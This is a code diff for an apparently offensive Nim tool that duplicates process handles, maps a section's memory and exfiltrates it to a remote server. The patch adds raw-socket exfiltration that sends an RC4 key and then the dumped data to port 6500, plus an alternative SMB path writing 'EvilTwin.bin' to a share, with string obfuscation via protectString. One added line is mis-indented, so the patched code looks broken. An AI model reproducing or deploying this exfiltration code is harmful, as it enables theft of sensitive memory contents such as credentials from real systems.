@@ -4,6 +4,10 @@ import std/[strformat, strutils, dynlib, tables, net]
 
 const serverIP = "0.0.0.0"
 const serverPort = 6500
+const smbShare = fmt"\\{serverIP}\Share\EvilTwin.bin"
+
+const useSMB = false
+const useRawSocket = true
 
 type
     NtQuerySystemInformation_t = proc(SystemInformationClass: ULONG, SystemInformation: PVOID, SystemInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.stdcall.}
@@ -272,29 +276,64 @@ when isMainModule:
     var mappedData = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0)
     echo "\n[!] Mapped Data at: 0x", repr mappedData, " - Size: ", size
     
-    var dataPointer = mappedData
-    #var dumpSeq: seq[byte] = @[]
-    #var countDP: int = 1
-    let socket = newSocket()
-    socket.connect(serverIP, Port(serverPort))
+if useRawSocket:
+        var dataPointer = mappedData
+        #var dumpSeq: seq[byte] = @[]
 
-    echo "\n[!] Sending Data to Server..."
-    var bytesSent: int = 0
-    while dataPointer <= (mappedData + size):
-        if (size.int - bytesSent) < 4096:
-            bytesSent += socket.send(dataPointer, (size.int - bytesSent))
-            break
-        else: 
-            bytesSent += socket.send(dataPointer, 4096)
-            dataPointer += 4096
+        # Raw Socket Data Exfiltration
+        let socket = newSocket()
+    
+        try:
+            socket.connect(protectString(serverIP), Port(serverPort))
+        except:
+            echo "\n[-] Could Not Connect to Server!\n[!] Quitting..."
+            quit(1)
+    
+        echo protectString("\n[!] Sending Encryption Key to Server...")
+        if not socket.trySend(rc4KeyStr):
+            echo protectString("[-] Could Not Send Encryption Key to Server!")
 
-    echo "\n[!] Sent ", bytesSent, " Bytes"
-    if bytesSent < size.int:
-        echo "[!] Bytes Sent (", bytesSent, ") Less Than Section Data (", size, ")...\n[!] File May Be Corrupted on Server"
+        ##if not socket.trySend($size):
+        ##    echo protectString("[-] Could Not Send Size to Expect to Server!")
+    
+        echo "\n[!] Sending Data to Server..."
+        var bytesSent: int = 0
+        while dataPointer <= (mappedData + size):
+            if (size.int - bytesSent) < 4096:
+                bytesSent += socket.send(dataPointer, (size.int - bytesSent))
+                break
+            else: 
+                bytesSent += socket.send(dataPointer, 4096)
+                dataPointer += 4096
+    
+        echo "\n[!] Sent ", bytesSent, " Bytes"
+        if bytesSent < size.int:
+            echo "[!] Bytes Sent (", bytesSent, ") Less Than Section Data (", size, ")...\n[!] File May Be Corrupted on Server"
+        
+        socket.close()
+
+    if useSMB:
+        # SMB Data Exfiltration
+        var dwBytesWritten: DWORD
+
+        echo "\n"
+        echo protectString(fmt"[!] Sending Data to {smbShare}")
+        var smbFile = CreateFile(smbShare, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](NULL))
+        if smbFile != INVALID_HANDLE_VALUE:
+            if WriteFile(smbFile, mappedData, size, addr dwBytesWritten, NULL) == 0:
+                echo "[-] Could Not Send Data Over SMB!\n[!] Quitting..."
+                quit(1)
+        else:
+            echo "[-] Could Not Create File on SMB Server!\n[!] Quitting..."
+            echo GetLastError()
+            quit(1)
+        
+        echo "\n[!] Sent ", dwBytesWritten, " Bytes"
+        if dwBytesWritten < size.int:
+            echo "[!] Bytes Sent (", dwBytesWritten, ") Less Than Section Data (", size, ")...\n[!] File May Be Corrupted on Server"
+        CloseHandle(smbFile)
 
     echo "\n[!] Cleaning Up..."
-    
-    socket.close()
     UnmapViewOfFile(mappedData)
     #discard readLine(stdin)
     for handleTuple in dupHandlesSeq: CloseHandle(handleTuple[1])
